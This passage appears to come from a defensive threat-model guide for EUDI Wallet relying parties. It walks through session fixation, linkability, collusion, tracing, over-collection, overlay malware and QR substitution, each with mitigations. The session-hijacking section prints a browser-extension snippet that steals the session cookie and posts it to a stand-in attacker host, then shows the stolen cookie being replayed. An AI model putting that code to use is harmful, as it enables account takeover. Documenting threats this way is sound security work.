The Attacker begins a legitimate login flow on the Relying Party's infrastructure, receiving an openid4vp:// connection string containing a cryptographically valid state parameter permanently bound to the Attacker's active session.

Artifact Produced: Server-generated state context tightly bounding the Attacker's origin HTTP connection.

The RP Server responds with an openid4vp:// URI containing the Attacker's session-bound state parameter and a request_uri pointing to the JAR. This is a standard, legitimate response — the RP has no way of knowing that the requester intends to relay this URI to a third party.

openid4vp://?
  client_id=https://rp.bank.example
  &request_uri=https://rp.bank.example/api/jar/req-7f3a9c2e
  &request_uri_method=get
  &state=ATTACKER_STATE_a8f29d4e7b1c
  
# ⚠️ The state parameter "ATTACKER_STATE_a8f29d4e7b1c" is bound to
# the attacker's active session (cookie: sid=atk_sess_9x2mK).
# Whoever completes the presentation with this URI will have their
# vp_token delivered to the RP tagged with the attacker's session.
#
# The attacker will relay this URI to the victim via:
#   - Hidden iframe: <iframe src="openid4vp://...">
#   - JavaScript redirect: window.location = "openid4vp://..."
#   - Phishing email with deep link

Artifact Produced: Rendered openid4vp:// string structurally embedding the malicious state identifier tag.

The Attacker maliciously injects this exact URI into the Victim's browser (e.g., via an iframe, automated redirect, or a phishing email link).

Artifact Produced: Obfuscated network execution link invisibly deployed inside the Victim's browser.

The unsuspecting Victim clicks the link, inadvertently launching their EUDI Wallet using the Attacker's crafted initialization string.

Artifact Produced: OS-level intent effectively hijacking the Victim's Wallet using the injected schema.

The Victim Wallet performs the standard cryptographic presentation and deposits the encrypted JWE vp_token payload at the RP's response_uri, passing back the exact state=ATTACKER_STATE parameter natively pulled from the URL.

POST /api/vp/response HTTP/1.1
Host: rp.example.com
Content-Type: application/x-www-form-urlencoded

vp_token=eyJhbG...[JWE]...
&presentation_submission={"id":"ps_1","definition_id":"pid_request"}
&state=ATTACKER_STATE

Artifact Produced: Genuine JWE vp_token submission fundamentally mislabelled containing the Attacker's state.

The RP Server decrypts the payload, determines it is mathematically valid, and binds the newly verified identity attributes to the active session strictly identified by ATTACKER_STATE.

Failure Path: If the RP Server implements secondary binding directly linking the state parameter to the original caller's browser fingerprint or IP address, the cross-context response fails evaluation and is immediately rejected.

Audit Telemetry: The RP Server logging mechanism emits a SESSION_FIXATION_ATTEMPT_BLOCKED alert tracing the state-to-IP origin mismatch.

// RP session store — state→session binding after VP processing
{
  "session_id": "atk_sess_9x2mK",
  "state": "ATTACKER_STATE_a8f29d4e7b1c",
  "state_created_at": "2026-04-06T10:05:12Z",
  "state_created_ip": "198.51.100.42",
  "vp_received_at": "2026-04-06T10:07:33Z",
  "vp_received_ip": "203.0.113.88",
  "verified_pid": {
    "family_name": "Schmidt",
    "given_name": "Maria",
    "date_of_birth": "1990-03-15",
    "issuer": "https://pid-provider.bundesdruckerei.de"
  },
  "session_elevated": true,
  "authenticated_as": "Maria Schmidt (PID verified)",
  "_fixation_indicators": {
    "ip_mismatch": true,
    "state_origin_ip": "198.51.100.42",
    "vp_submission_ip": "203.0.113.88",
    "user_agent_mismatch": true
  }
}
// ⚠️ The RP binds Maria Schmidt's PID to the attacker's session.
// The attacker (198.51.100.42) now has an authenticated session
// as Maria Schmidt — the victim (203.0.113.88) sees nothing.
// A secure RP would compare state_created_ip vs vp_received_ip
// and reject with SESSION_FIXATION_ATTEMPT_BLOCKED.

Artifact Produced: Legitimate decrypted PID payload fatally appended to the ATTACKER_STATE memory context.

Because the Attacker holds the session cookie natively logically associated with the ATTACKER_STATE, the RP Server seamlessly elevates the Attacker's privilege, logging them into the Victim's hijacked identity context.

Artifact Produced: Highly privileged RP session HTTP context irrevocably co-opting the Victim's exact identity.

Attack Vector: Attacker pre-sets or predicts the OAuth state parameter used in the OpenID4VP flow. In the standard flow (§9.2 step 3), the RP generates a state value, includes it in the JAR, and expects it back in the Wallet's response. If the attacker can fix this state to a value they know (e.g., by injecting a crafted request_uri into the victim's browser), they can correlate the Wallet's response to their own session. When the victim completes the presentation, the Wallet redirects the response to the RP's response_uri with the attacker's state — and the RP maps it to the attacker's session, granting the attacker an authenticated session backed by the victim's PID.

Impact: Full session hijack — the attacker gains an authenticated session at the RP as the victim. This is functionally equivalent to Credential Replay in impact but uses a different mechanism: instead of replaying a captured token, the attacker tricks the system into delivering a fresh, legitimate token into a pre-arranged session bucket. For banking RPs (§21), this could enable account takeover.

Mitigation:

  • Primary: The RP must generate the state parameter as a cryptographically random value (≥128 bits of entropy) bound to the server-side session (§9.2 step 3). The state must be stored in the RP's session store and validated against the session on response receipt.
  • Secondary: The state value should be one-time-use — invalidated after the first response that carries it.
  • Tertiary: Bind the state to additional session context (e.g., the user's browser fingerprint, IP address, or a server-side session cookie) so that even if an attacker knows the state, they cannot claim the response from a different browser/IP. Same-device DC API flows: The DC API's navigator.credentials.get() returns the response directly to the calling JavaScript context, bypassing the redirect-based state mechanism entirely — this eliminates session fixation for same-device flows. The threat primarily affects cross-device and redirect-based flows.
  • response_code fixation variant: When using response_mode=direct_post with a redirect_uri callback, the RP returns a response_code in the redirect after processing the Wallet's direct_post submission (per OID4VP §7.2). This response_code creates a similar fixation surface: if the response_code is predictable or replayable, the attacker can claim the verification result by presenting the known response_code to the RP's redirect endpoint. The response_code MUST be cryptographically random, single-use, short-lived (≤60 seconds), and bound to the server-side session — preventing a fixation attack on the response retrieval step.
29.2.12 RP-Side Attestation Linkability

Threat Summary: The RP stores unique, fixed cryptographic elements from presented attestations — SD-JWT disclosure salts, cnf.jwk thumbprints, Status List indices, or issuer signature values — and uses them to correlate multiple presentations by the same user across sessions. Because these elements are fixed per attestation and identical across every presentation of that attestation, a single database query can link transactions that the user expected to be unlinkable, defeating selective disclosure guarantees.

Classification:

Property Value
ARF Reference TR36 — RP Correlates Presentations via Unique Attestation Elements
CWE CWE-359 — Exposure of Private Personal Information to an Unauthorized Actor
STRIDE Information Disclosure (behavioural profiling via cryptographic linkability)
Severity S1 — High

A user authenticates with an RP out of necessity, releasing their family_name. Within the cryptography of an SD-JWT VC, the actual string is hashed using a unique, randomized sd_jwt_salt attached specifically to that single presentation attribute during issuance.

// The unique salt mathematically linked to the user's family_name
[
  "2GLC42sKQveCfGfryNRN9w", // The salt (128-bit minimum entropy)
  "family_name",
  "Müller"
]

Artifact Produced: sd_jwt_salt presentation attribute hash (Cryptographic layer).

Violating EUDI data minimization principles, the RP Server persistently saves the raw sd_jwt_salt (or a cnf.jwk thumbprint, or a Status List index) into their backend database alongside the user profile rather than fundamentally discarding it immediately post-verification.

Failure Path: If strict Database Audit Triggers were implemented, storing a raw sd_jwt_salt value would be blocked by a data-retention policy violation.

Audit Telemetry: The Compliance Logging layer generates a DATA_MINIMIZATION_VIOLATION alert upon detecting the sd_jwt_salt column insertion.

-- The malicious or negligent RP stores the unique crypto artifacts
INSERT INTO user_profiles (session_id, family_name, linked_salt)
VALUES ('session_A', 'Müller', '2GLC42sKQveCfGfryNRN9w');

Artifact Produced: user_profiles correlation record (Database layer).

Weeks later, the user returns under a supposedly anonymous context, releasing only an age_over_18 boolean predicate to access restricted content. However, because they are presenting the same physical attestation (Method A, single-issuance per ARF), the underlying sd_jwt_salt for that specific age claim remains mathematically identical.

// The Wallet transmits the EXACT same disclosure string in both sessions
// because the Attestation Provider uniquely baked the salt into the credential.
"~WyJFTXk0NnI1... (salt)", "age_over_18", true]"

Artifact Produced: Identical physical attestation string (Application layer).

The RP Server automatically sweeps its database, explicitly evaluating if the newly presented string of unique cryptographic artifacts mathematically matches any pre-existing historical logs.

-- The backend runs a passive real-time correlation check
SELECT session_id, family_name 
FROM user_profiles 
WHERE linked_salt = '2GLC42sKQveCfGfryNRN9w';
-- Returns: 'session_A', 'Müller'

Artifact Produced: user_profiles correlation match result (Database layer).

The RP Server algorithmically links Session B to Session A, merging the supposedly anonymous age-check directly into the user's permanent, named surveillance profile and utterly defeating the exact selective disclosure safeguards that SD-JWT VC was designed to guarantee.

Attack Vector: The RP stores unique, fixed elements from presented attestations — salts, hash values, the cnf.jwk public key thumbprint, the issuer signature value, or the Status List index — and uses them to correlate multiple presentations by the same user across different transactions. Each SD-JWT VC contains per-disclosure salts and hash digests in the _sd array; each mdoc contains per-element random values and the MSO digestAlgorithm outputs. These elements are unique per attestation and fixed across presentations of the same attestation (ARF Topic A §2.1). A single malicious database query (SELECT user_id FROM presentations WHERE salt_hash = X) can link transactions that the user expected to be unlinkable.

Impact: User tracking and profiling within a single RP's transaction history — enabling behavioural analysis, usage pattern mining, and inference attacks (ARF risk R14: Surveillance). If the RP is also collecting browsing data, location data, or purchase history, the attestation linkability provides a universal join key that unifies the user's cross-session profile. This violates the user's reasonable expectation under eIDAS Art. 5b(4) and GDPR Art. 5(1)(b) (purpose limitation). The ARF's Topic A (§2.2) extensively analyses this threat and its variants. Even without malicious intent, a data breach exposing stored unique elements would enable a third party to perform the same linkability analysis.

Mitigation:

  • Primary: Anti-linkability practices per §11.10 — the RP must discard all unique attestation elements (salts, disclosure hashes, signature values, cnf.jwk key material) immediately after completing the verification pipeline. The RP should retain only the extracted attribute values (given_name, birth_date, etc.) and an application-level session token, never the raw cryptographic artefacts.
  • Issuer-side: The ARF mandates that PID Providers support Method A (once-only attestations) or Method B (limited-time attestations) per Topic A §3 and Topic 10 HLRs — meaning each attestation is used for a limited number of presentations, reducing the correlation window.
  • Organisational: Relying Parties found offending can have their WRPAC revoked by the national Registrar (ARF §7.4.3), permanently blocking them from the ecosystem.
  • Technical verification: Implement automated code review or runtime assertions that verify unique elements are not persisted to any durable storage.
29.2.13 Cross-RP Collusion

Threat Summary: Multiple RPs share unique attestation elements — SD-JWT salts, cnf.jwk thumbprints, or signature values — through a side channel (shared database, data broker, or corporate parent). By matching these fixed cryptographic identifiers across their datasets, colluding RPs can de-anonymise users and construct cross-service profiles (e.g., linking a citizen’s healthcare diagnosis with their credit score), enabling the “wholesale surveillance” system risk identified by the ARF.

Classification:

Property Value
ARF Reference TR84 — RP-to-RP Data Sharing · SR1 — Wholesale Surveillance
CWE CWE-359 — Exposure of Private Personal Information to an Unauthorized Actor
STRIDE Information Disclosure (cross-service de-anonymisation via shared cryptographic identifiers)
Severity S0 — Critical

The Citizen utilizes their EUDI Wallet to securely present health credentials to a Healthcare RP. The underlying transmission structurally includes fixed cryptographic constants, such as the cnf_jwk thumbprint representing the public key permanently bound to the attestation.

// The structurally bound identifier transferred during presentation
{
  "cnf_jwk_thumbprint": "urn:ietf:params:oauth:jwk-thumbprint:xyz890",
  "health_condition": "Diabetes"
}

Artifact Produced: health_condition disclosure payload mapping (Application layer).

Shortly after, the Citizen utilizes the identical attestation to present financial data to an independent Insurance RP.

Because the citizen hasn't rotated their credential, the mathematically identical cnf_jwk thumbprint (derived from the same device-bound key) is inevitably transmitted again during the cryptographic pairing to the new service.

// The structurally identical identifier transferred during secondary presentation
{
  "cnf_jwk_thumbprint": "urn:ietf:params:oauth:jwk-thumbprint:xyz890",
  "credit_tier": "Poor"
}

Artifact Produced: credit_tier disclosure payload mapping (Application layer).

Believing the data is "safely anonymized" due to systematically stripping direct names, the Healthcare RP sells a data dump inadvertently mapping the allegedly "meaningless" thumbprint string directly to a highly sensitive medical diagnosis condition.

# Allegedly anonymized leaked data broker feed
internal_id,thumbprint,diagnosis,timestamp

Artifact Produced: internal_id anonymized data broker feed (External layer).

The Insurance RP simultaneously sells bulk financial analytics, similarly mapping the structurally identical thumbprint string to the user's credit score standing within their own supposedly anonymous logs.

# Secondary anonymized leaked data broker feed
customer_ref,thumbprint,credit_tier,timestamp
cust_99x,xyz890,Poor,2024-03-05T14:30:00Z

Artifact Produced: customer_ref anonymized data broker feed (External layer).

A central Data Broker (or colluding corporate parent) acquires both datasets. By executing a simple database JOIN operation matching on the thumbprint strings, the Broker synthesizes a catastrophic cross-service behavior graph, inextricably linking the user's hidden financial constraints to their medical vulnerabilities. This enacts the exact Wholesale Surveillance system risk (SR1) defined in the ARF.

Failure Path: The ARF ecosystem lacks a native technical mechanism to detect this post-verification collusion. It relies entirely on Method C/D rotating attestations or ZKP adoptions to systematically fundamentally prevent this wholesale tracking.

Audit Telemetry: The ecosystem generates an UNLINKABILITY_COMPROMISED post-incident forensic trace following external data broker discovery.

{
  "surveillance_profile_xyz890": {
    "identifier_key": "urn:ietf:params:oauth:jwk-thumbprint:xyz890",
    "linked_attributes": {
      "healthcare_rp_log": { "condition": "Diabetes", "timestamp": 1709230000 },
      "insurance_rp_log": { "credit_tier": "Poor", "timestamp": 1709234500 }
    }
  }
}

Artifact Produced: Matched surveillance_profile_xyz890 linkage graph (External layer).

Attack Vector: Multiple RPs share the unique attestation elements they received from users' presentations — salts, hash digests, cnf.jwk thumbprints, or signature values — through a side channel (shared database, API, data broker, or informal agreement). By matching these elements across their respective datasets, the colluding RPs can de-anonymise users and construct cross-service profiles. For example, if a user presents the same PID to a bank and a telecom, and both store the SD-JWT salt for the family_name disclosure, they can match on this salt to confirm it's the same person — even without sharing the actual attribute value. The ARF identifies this as the 'wholesale surveillance' system risk (SR1).

Impact: Cross-service user profiling and de-anonymisation at scale. The colluding RPs can derive the user's full activity graph across all participating services. This constitutes wholesale surveillance (ARF risk SR1) and violates GDPR Art. 5(1)(b) (purpose limitation) and eIDAS Art. 5b(4). The damage is proportional to the number of colluding RPs and the sensitivity of the services involved. Critically, this attack works even with once-only attestations (Method A) if the attestation was presented to each RP before rotation — the window is reduced but not eliminated unless ZKP-based proofs are used (ARF §9.4.3.5.3).

Mitigation:

  • Technical (RP-side): Same as RP-Side Attestation Linkability — discard unique attestation elements immediately after verification per §11.10. If unique elements are not stored, they cannot be shared.
  • Technical (issuer-side): Once-only attestations (ARF Topic A, Method A) ensure each RP receives a different attestation instance, making cross-RP matching infeasible. Rotating-batch attestations (Method C) and per-Relying Party attestations (Method D) further reduce the correlation surface.
  • Future: Zero-Knowledge Proofs (ARF §9.4.3.5.3, Topic G) would eliminate this threat entirely by allowing the user to prove attribute statements without revealing any linkable cryptographic artefacts.
  • Organisational: Access certificate revocation for offending RPs (ARF §7.4.3); regulatory enforcement via GDPR supervisory authorities; mandatory audits of data handling practices. The ARF notes that organisational and enforcement measures are the primary deterrent for cross-RP collusion, since full technical prevention requires ZKP adoption.
29.2.14 Identifier-Based Tracing

Threat Summary: Stable, protocol-embedded identifiers — Status List indices, cnf.jwk thumbprints, issuer signature values, or iss+sub pairs — allow an RP (or network-level observer) to trace a user across sessions or services. Unlike transient attestation elements (salts), these identifiers are structurally necessary for the protocol to function and remain identical across every presentation of the same credential, making them persistent user pseudonyms.

Classification:

Property Value
ARF Reference TR39 — Tracing via Stable Structural Identifiers
CWE CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor
STRIDE Information Disclosure (user surveillance via stable protocol-embedded identifiers)
Severity S1 — High

A user authenticates utilizing their wallet. The protocol innately contains fixed structural constants necessary for cryptographic validation, such as the Status List Index (e.g., 45991) mapped specifically to that individual attestation.

// The payload invariably leaks the exact revocation index

The user returns to the RP Server over a month later. Even if they present completely different pseudo-anonymous attributes to mask their returning identity, the identical structural constraints (the exact same Status List Index mapped to that credential serial) must logically be transmitted again to allow the RP to check revocation.

// The structurally identical status_list index must be presented again

  "status": {
    "status_list": {
      "idx": 45991,
      "uri": "https://issuer.example.eu/status-list/1"

Whether maliciously executed by the RP Server itself, or passively observed by an infrastructure-level network interceptor monitoring the /status-list GET requests, the exact 45991 index tracks the user's recurrent presence without ever requiring access to their literal identity data. This breaks the unlinkability requirements defined in eIDAS Article 5b.

Failure Path: Strict ARF implementations dictate randomly assigned, sufficiently padded Status List indexes precisely to prevent correlation. If securely batched, this tracing attempt fails to logically isolate an individual user.

Audit Telemetry: The Trust Infrastructure metrics observe REPETITIVE_STATUS_INDEX_POLLING indicating localized tracking behavior patterns.

Artifact Produced: REPETITIVE_STATUS_INDEX_POLLING observer log (Network layer).

Attack Vector: Attacker (malicious RP, insider, or third party via breach) uses stable identifiers embedded in the attestation to trace the user across services or over time. Key stable identifiers include: (a) the Status List index (§11.5) — unique per attestation and queryable by any RP that knows the Status List URL, (b) the cnf.jwk public key or its thumbprint — the same key is used in the KB-JWT for every presentation of the same attestation, (c) the SD-JWT iss + sub combination if a subject identifier is present, (d) the mdoc docType + issuerAuth certificate serial number. Unlike RP-Side Attestation Linkability (which uses transient unique elements like salts), these identifiers are structurally stable and often necessary for the protocol to function.

Impact: User surveillance (ARF risk R14). The Status List index is particularly dangerous because it's a public, queryable identifier — any entity that knows the Status List URL and the user's index can check whether the user's credential has been revoked, leaking information about the user's status. The cnf.jwk thumbprint (JWK Thumbprint per RFC 7638) is deterministically derived from the public key, so any RP that receives a presentation from the same key can compute the same thumbprint and correlate transactions.

Mitigation:

  • Primary: The RP should use application-level pseudonyms (§16) rather than raw attestation identifiers for session management and user tracking. The pseudonym is RP-specific by design and does not leak information to other RPs.
  • Status List privacy: The ARF's Topic A §5.3 recommends that Status List indices be randomly assigned (not sequential) and that each Status List contain a sufficiently large number of entries to ensure herd privacy — the RP downloading a Status List should not be able to infer which specific credential was just presented. The RP should download Status Lists proactively, not per-presentation.
  • Key rotation: Once-only or limited-time attestations (Topic A Methods A/B) rotate the cnf.jwk along with the attestation, preventing long-term key-based tracing.
  • Implementation: Never expose Status List indices, cnf.jwk thumbprints, or issuer signature values in user-facing URLs, cookies, or log files that could be correlated externally.
29.2.15 Over-Identification

Threat Summary: The RP requests full PID attributes (name, birth date, address) in its DCQL query when a pseudonym or a derived attribute (age_over_18) would suffice. Often driven by convenience engineering rather than malice, this exposes the user to the full spectrum of linkability and tracing risks that selective disclosure was designed to prevent, and violates eIDAS Art. 5b(9) and GDPR Art. 5(1)(c) data minimisation requirements.

Classification:

Property Value
ARF Reference TR85 — Tracking via Unnecessary Person Identification Data
CWE CWE-250 — Execution with Unnecessary Privileges
STRIDE Information Disclosure (excessive attribute collection beyond operational necessity)
Severity S1 — High

The RP registers with the National Ecosystem precisely articulating its use case (e.g., merely validating age for age-restricted purchases), legally limiting its logical access constraints via the WRPRC ruleset.

// The RP explicitly registered for a strict minimal subset
{
  "client_id": "liquor-store-rp.eu",
  "intended_attributes": ["age_over_18"],
  "business_purpose": "Regulatory Age Verification"
}

Artifact Produced: client_id registration request (Business layer).

The national Registrar issues a WRPRC that codifies the RP's declared intended attributes (age_over_18 only). This certificate serves as the ecosystem's governance control — the Wallet can later compare the RP's actual DCQL request against the WRPRC's attribute scope to detect over-collection.

// The WRPRC strictly bounding the RP's legal scope
{
  "iss": "https://registrar.example.eu",
  "sub": "liquor-store-rp.eu",
  "scope": "age_over_18"
}

Artifact Produced: WRPRC Certificate token (Ecosystem layer).

Due to poor engineering logic or convenience-driven laziness, the RP constructs an inflated, overarching dcql_query sweeping the user's entire core PID dataset (family_name, birth_date, address), fundamentally disregarding overarching ecosystem privacy covenants and the GDPR data minimization mandate (Art 5).

Failure Path: A Wallet implementing strict ARF guardrails dynamically cross-references the inbound dcql_query against the WRPRC and explicitly blocks or flags attributes not legally registered.

Audit Telemetry: The Wallet OS issues an UNAUTHORIZED_ATTRIBUTE_REQUESTED warning trace directly exposing the mismatch to the user display layer.

"dcql_query": {
  "credentials": [{
    "id": "pid",
    "format": "vc+sd-jwt",
    "claims": [
      { "path": [ "family_name" ] },
      { "path": [ "given_name" ] },
      { "path": [ "birth_date" ] },
      { "path": [ "resident_address" ] } // Totally irrelevant for a simple 18+ age verification!
    ]
  }]
}

Artifact Produced: dcql_query Authorization Request (Application layer).

Assuming the system is fully automated and structurally governed by the Wallet, the User casually accepts the Wallet Unit's consent screen without carefully auditing the bloated attribute list, wrongly assuming the RP is only extracting their age.

The Wallet faithfully constructs the extensive presentation response, transferring the User's unmitigated, highly sensitive demographic profile directly into the RP's backend, significantly magnifying the severity of any subsequent internal data breaches and blatantly violating GDPR Art. 5.

// The significantly bloated response payload carrying fully un-minimized PID
{
  "vp_token": {
    "family_name": "Müller",
    "given_name": "Hans",
    "birth_date": "1990-01-01",
    "resident_address": "Berlin, DE"
  }
}

Artifact Produced: Bloated vp_token disclosure (Application layer).

Attack Vector: The RP requests PID attributes (given_name, family_name, birth_date, etc.) in its DCQL query when a pseudonym (§16) or a derived attribute (e.g., age_over_18 instead of birth_date) would suffice for the use case. This is not malicious per se — it often results from convenience-driven engineering ("just ask for the full PID") rather than careful data minimisation analysis. However, it enables the RP to build a full identity profile where none was needed, and exposes the user to all of the linkability risks (RP-Side Attestation Linkability through Identifier-Based Tracing) that could have been avoided. The ARF identifies this as TR85 ("attacker can track and trace a user by using person identification data where identification is not required").

Impact: Privacy violation at scale. eIDAS Art. 5b(9) explicitly requires that "the relying party shall not request any data beyond what is necessary for the intended purpose". GDPR Art. 5(1)(c) (data minimisation) and Art. 25(2) (data protection by default) impose the same obligation. Systematic over-identification could trigger GDPR enforcement by supervisory authorities, with fines up to €20M or 4% of global turnover. Beyond regulatory risk, over-identification degrades user trust in the ecosystem — if users learn that RPs routinely demand full PID when checking age, they will resist adopting the EUDI Wallet.

Mitigation:

  • Primary: Implement pseudonym-based authentication (§16) for returning-user scenarios — Use Cases A–D provide patterns where pseudonyms replace PID for session management, login, and progressive assurance.
  • DCQL query design: Construct DCQL queries (§17) that request the minimum attribute set. Use age_over_18 or age_over_65 predicates instead of birth_date where age verification is the goal. Use nationality alone instead of full PID when citizenship is the criterion.
  • Registration certificate enforcement: The WRPRC (§5.3) lists the attributes the RP registered to request — the Wallet can compare the DCQL query against the WRPRC and warn the user if the RP is requesting attributes beyond its registered scope (ARF §7.6.3.3).
  • Ecosystem governance: National Registrars review attribute requests during RP registration (§3) and can reject registrations that fail the necessity test.
  • Technical guardrail: Implement a server-side policy engine (§27 policy-as-code) that validates outgoing DCQL queries against the RP's registered attribute set before constructing the JAR, preventing accidental over-collection.
29.2.16 User Device Malware: Consent Manipulation

Threat Summary: Malware on the user’s device overlays or manipulates the Wallet consent screen, tricking the user into authorising a presentation to a different RP or approving different attributes than displayed. The WSCD protects private keys from extraction, but cannot prevent the user from voluntarily triggering a signing operation under false pretences — the resulting cryptographic signatures are indistinguishable from genuine consent.

Classification:

Property Value
ARF Reference TT5.7 — Compromised User Device
CWE CWE-1021 — Improper Restriction of Rendered UI Layers or Frames
STRIDE Tampering (consent flow manipulation) · Repudiation (legal ambiguity over genuine consent)
Severity S0 — Critical

The EUDI Wallet natively renders the actual identity of the requesting Relying Party, explicitly listing exactly which attribute claims will be surrendered (e.g., "Shady LLC requests: full PID") based on the verified WRPAC chain.

// The underlying legitimate intent
{
  "client_id": "shady-llc.example.com"
}

Rogue device-level malware draws a sophisticated, opaque visual overlay on top of the Wallet app interface, deceptively obscuring the core identity text to falsely display a trustworthy origin like: "Official State Portal". This operates inherently at the OS Display level, entirely bypassing the Wallet's native application sandbox.

Failure Path: If the device OS supports robust Trusted Execution Environments (TEE) utilizing secure screen overlay protections (e.g., Android FLAG_SECURE), the malware rendering intent is actively blocked before execution.

Audit Telemetry: The OS-level Endpoint Detection and Response (EDR) agent logs a local SCREEN_OVERLAY_ATTACK_DETECTED system protection alert.

// The physical Wallet receives the actual payload below:
{
  "client_id": "shady-llc.example.com",
  "client_name": "Shady LLC Data Aggregator"
}
// But the Malware forces the screen pixels to selectively render: 
// "Official State Portal requests your credential"

Artifact Produced: SCREEN_OVERLAY_ATTACK_DETECTED system protection alert (Device layer).

Fooled by the malicious visual manipulation actively overlaid across their own screen, the User physically clicks or biometric-authenticates the underlying actual Wallet "Approve" button, genuinely believing they are proceeding with a secure, regulated governmental action.

Because the Wallet's hardware-backed Secure Element (WSCD) accurately interprets the physical approval signal independently of the display layer OS, it performs an entirely legitimate cryptographic ECDSA signing operation, blindly executing a catastrophic data transfer to the attacker without the system triggering an internal constraint fault.

// The perfectly signed JWS executing the unauthorized transfer
{
  "protected": "eyJhbG... (valid ECDSA signature from WSCD)",
  "payload": "eyJjbG... (transfer to shady-llc)"
}

Artifact Produced: Cryptographically valid signed presentation JWS (Cryptographic layer).

Attack Vector: Malware on the user's phone overlays or manipulates the Wallet consent screen (overlay attack), tricking the user into approving presentation to a different RP or approving different attributes than displayed. The WSCD protects private keys from extraction even on a rooted device, but cannot prevent the user from voluntarily authorising a signing operation under false pretences.

Impact: RP receives cryptographically valid credentials that the user did not intentionally present to this RP; potential social engineering amplification; legal ambiguity on consent validity under eIDAS Art. 5b(3) ("the user shall be in full control"). The RP has no way to distinguish a malware-manipulated consent from a genuine one — the cryptographic signatures are identical.

Mitigation:

  • Primary (Wallet Provider domain): The ARF assigns device security to the Wallet Provider (Topic T, WPSM_03): rooting/jailbreak detection, emulator detection, app integrity checks, and a 4-level security posture framework with WUA revocation at Level 4 (Critical). The RP cannot directly mitigate device-side malware.
  • Secondary (ARF Topic AA): For SCA flows, the ARF mandates secure rendering of the authorisation screen in an isolated Wallet component, preventing overlay attacks on the payment consent.
  • RP-side mitigations: Implement transaction-specific confirmation for high-value actions (e.g., a separate verification step after credential presentation); for payment SCA, use Dynamic Linking (transaction_data_hashes_alg in the JAR, §14.7) so the Wallet signs over the exact transaction details the user sees — even if the display is overlaid, the signed payload reflects the real transaction.
  • Detection: Monitor for anomalous patterns (e.g., same user presenting credentials to multiple unrelated RPs in rapid succession).
29.2.17 Browser-Side Session Hijacking: Post-Verification

Threat Summary: Man-in-the-Browser malware or a malicious browser extension steals the authenticated session cookie/token after successful EUDI Wallet verification. The entire EUDI cryptographic chain completes correctly, but the resulting application session is a standard web artefact — a simple cookie replay from a foreign context grants the attacker full account takeover, retroactively bypassing all EUDI protections.

Classification:

Property Value
ARF Reference TT5.7 — Compromised User Device
CWE CWE-384 — Session Fixation
STRIDE Spoofing (impersonation via stolen session) · Elevation of Privilege (unauthenticated → full account access)

The User executes an impeccable cryptographic authentication mechanism, relying flawlessly on the strongest EUDI Wallet security standards (JWS/JWE end-to-end processing) operating over the W3C DC API.

// The Wallet securely delivers the sealed presentation to the RP
{
  "vp_token": "eyJhbG... (verified EUDI signature)",
  "presentation_submission": { "id": "sub_1", "definition_id": "req_1" }
}

Artifact Produced: Verified vp_token authentication payload (Cryptographic layer).

Successfully decrypting the Wallet's secure payload, the Relying Party Server transitions the verified state into a standard web JWT/Cookie paradigm, dispensing a standard AUTH_SESS_ID string to the User's browser. The EUDI cryptographic boundary officially ends here.

Artifact Produced: AUTH_SESS_ID session cookie (application-layer).

HTTP/1.1 200 OK
Set-Cookie: AUTH_SESS_ID=eyJhbG...; HttpOnly; Secure; SameSite=Lax
Content-Type: application/json

{"status": "EUDI Authentication Successful, Session Established"}

A malicious Man-in-the-Browser (MitB) extension or resident JavaScript logic quietly hoovers the plaintext AUTH_SESS_ID token directly from the vulnerable local browser storage buffer (document.cookie).

// The malicious extension executing in the background script
const cookies = await browser.cookies.getAll({ domain: "bank.example" });
const targetSession = cookies.find(c => c.name === "AUTH_SESS_ID");
fetch("https://attacker.example/exfil", { method: "POST", body: targetSession.value });

Artifact Produced: Exfiltrated AUTH_SESS_ID token (Browser layer).

Bypassing the intricate, impenetrable EUDI cryptography entirely—because the subsequent web session assumes it is implicitly authenticated—the attacker simply injects the stolen cookie into an independent external HTTP request sent from their command server.

GET /api/accounts/transfer HTTP/1.1
Host: bank.example
Cookie: AUTH_SESS_ID=eyJhbG...

Artifact Produced: Replayed HTTP request bypassing EUDI (Network layer).

The Relying Party Server blindly identifies the structurally valid tracking cookie, systematically executing a catastrophic, retroactive hijack of the identity session established exclusively via the high-security Wallet mechanism.

Failure Path: If the RP Server implements rigid network-origin constraints binding the session strictly to the original TLS client certificate or exact IP address during issuance, the transplanted token is immediately rejected.

Audit Telemetry: The WAF logs a SESSION_IP_MISMATCH or UNEXPECTED_GEO_LOGIN when the attacker replays the cookie from a foreign network.

Artifact Produced: Fully authenticated session state executing malicious logic (Application layer).

Attack Vector: Man-in-the-Browser (MitB) malware or a malicious browser extension steals the authenticated session cookie/token after successful EUDI Wallet verification. The EUDI cryptographic chain (JAR → JWE → KB-JWT → SD-JWT VC verification) completes correctly, but the resulting application session is a standard web artefact vulnerable to cookie theft.

Impact: Attacker obtains an authenticated session without possessing the user's credentials; bypasses all EUDI cryptographic protections retroactively; full account takeover possible. For financial RPs (§21), this could enable unauthorised transactions, fund transfers, or account modifications. This threat is not EUDI-specific but is operationally critical in the context of high-value identity flows where the session represents a verified legal identity.

Mitigation:

  • Primary: Standard web session security hardening — HttpOnly + Secure + SameSite=Strict cookies; short session lifetimes (recommended ≤30 minutes for sensitive operations); session invalidation on IP change or user-agent change.
  • Secondary: Re-verification (step-up authentication) for high-risk actions — require a fresh EUDI Wallet presentation or WebAuthn challenge before authorising payments, profile changes, or data exports.
  • Tertiary: Consider binding sessions to a device-specific proof: DPoP-style proof-of-possession tokens (RFC 9449), or a client certificate (mutual TLS) that the browser extension cannot extract.
  • Scope limitation: The DC API's end-to-end encryption (JWE/HPKE) protects the credential response from browser extension interception, but does not protect the session state the RP creates after verification — this boundary between EUDI-layer and application-layer security is the core architectural insight.
29.2.18 Cross-Device QR Code Substitution

Threat Summary: Malware on the user’s desktop browser replaces the RP’s legitimate QR code with an attacker-controlled QR code, redirecting the Wallet to a phishing verification endpoint. The user’s Wallet presents real credentials to the attacker’s infrastructure. Unlike a relay attack, the QR is replaced rather than relayed — the attacker receives credentials directly.

Property Value
ARF Reference TR103 — QR Code Substitution
CWE CWE-451 — User Interface (UI) Misrepresentation of Critical Information
STRIDE Spoofing (phishing endpoint masquerades as legitimate RP) · Information Disclosure (PID exfiltration)

The legitimate Relying Party Server generates a perfectly secure, session-bound QR code instructing the Wallet to contact legitimate-rp.example utilizing the OpenID4VP URI scheme.

Artifact Produced: Visual representation of openid4vp://?client_id=bank.example&request_uri=...

Local malware or a malicious browser extension actively monitoring the Victim's desktop visual interface intercepts the HTML rendering process. It swaps the legitimate graphic with a counterfeit QR code pointing to an attacker-controlled endpoint.

</div>

